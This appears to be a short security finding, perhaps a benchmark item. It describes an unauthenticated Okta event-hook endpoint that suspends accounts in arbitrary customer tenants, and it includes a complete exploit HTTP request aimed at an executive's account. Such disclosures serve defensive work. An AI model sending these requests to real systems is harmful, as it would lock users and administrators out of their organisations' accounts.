diagnosis: The Okta event hook receiver executes user account suspensions based on customerTenantId and targetUserExternalId provided in the request body without verifying the Okta verification challenge or HMAC authorization header. An attacker can suspend administrator and employee accounts across arbitrary customer tenants.
exploit_request:
POST /api/okta/webhooks/user-lifecycle HTTP/1.1
Host: sso-sync.saas.internal:9002
Content-Type: application/json

{
  "eventType": "user.lifecycle.suspend",
  "targetUserExternalId": "usr_ceo_active_01",
  "customerTenantId": "tenant_enterprise_9918"
}
